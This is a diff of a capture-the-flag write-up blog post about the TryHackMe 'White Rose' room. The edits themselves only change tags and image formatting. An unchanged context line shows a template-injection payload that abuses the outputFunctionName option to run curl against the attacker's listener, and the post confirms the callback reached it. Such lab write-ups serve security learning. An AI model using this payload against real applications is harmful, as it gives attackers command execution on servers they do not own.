@@ -2,8 +2,8 @@
 layout: post
 title: White Rose (TryHackMe)
 date: 2025-04-19
-categories: [CTF, SSTI]
-tags: [Tryhackme]
+categories: [CTF, TryHackme]
+tags: [SSTI, Sudo]
 ---
 
 ### Nmap
@@ -88,7 +88,8 @@ Since Gayle is admin we can login as admin using these creds
 name=test&password=test&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync('curl http://10.17.X.X:8000');s
 ```
 - We got a hit in our python server
-![Python-server](https://c00lrabbit.github.io/assets/Images/python-server.png){: .center-image }
+
+![Python-server](https://c00lrabbit.github.io/assets/Images/python-server.png)
 
 Shell.sh
 ```bash
